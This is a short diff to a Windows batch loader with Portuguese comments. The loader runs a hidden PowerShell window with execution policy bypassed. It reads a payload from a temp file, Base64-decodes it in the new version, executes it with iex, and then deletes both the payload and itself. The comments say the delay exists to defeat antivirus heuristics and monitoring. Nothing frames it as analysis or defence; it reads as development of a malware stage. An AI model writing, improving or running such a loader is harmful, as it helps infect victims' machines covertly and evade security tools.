@@ -1,8 +1,8 @@
 @echo off
-set "f=%TEMP%\f.log"
-:: Delay para quebrar heurística
-timeout /t 3 /nobreak >nul
-:: Executa PowerShell forçando TLS 1.2
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $s=Get-Content '%f%' -Raw; iex $s"
-del "%f%"
+set "p=%TEMP%\f.log"
+:: Delay para quebrar a monitorização imediata
+timeout /t 2 /nobreak >nul
+:: Lê o Base64, descodifica e executa sem tocar no disco com o código real
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$b=Get-Content '%p%'; [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | iex"
+del "%p%"
 del "%~f0"
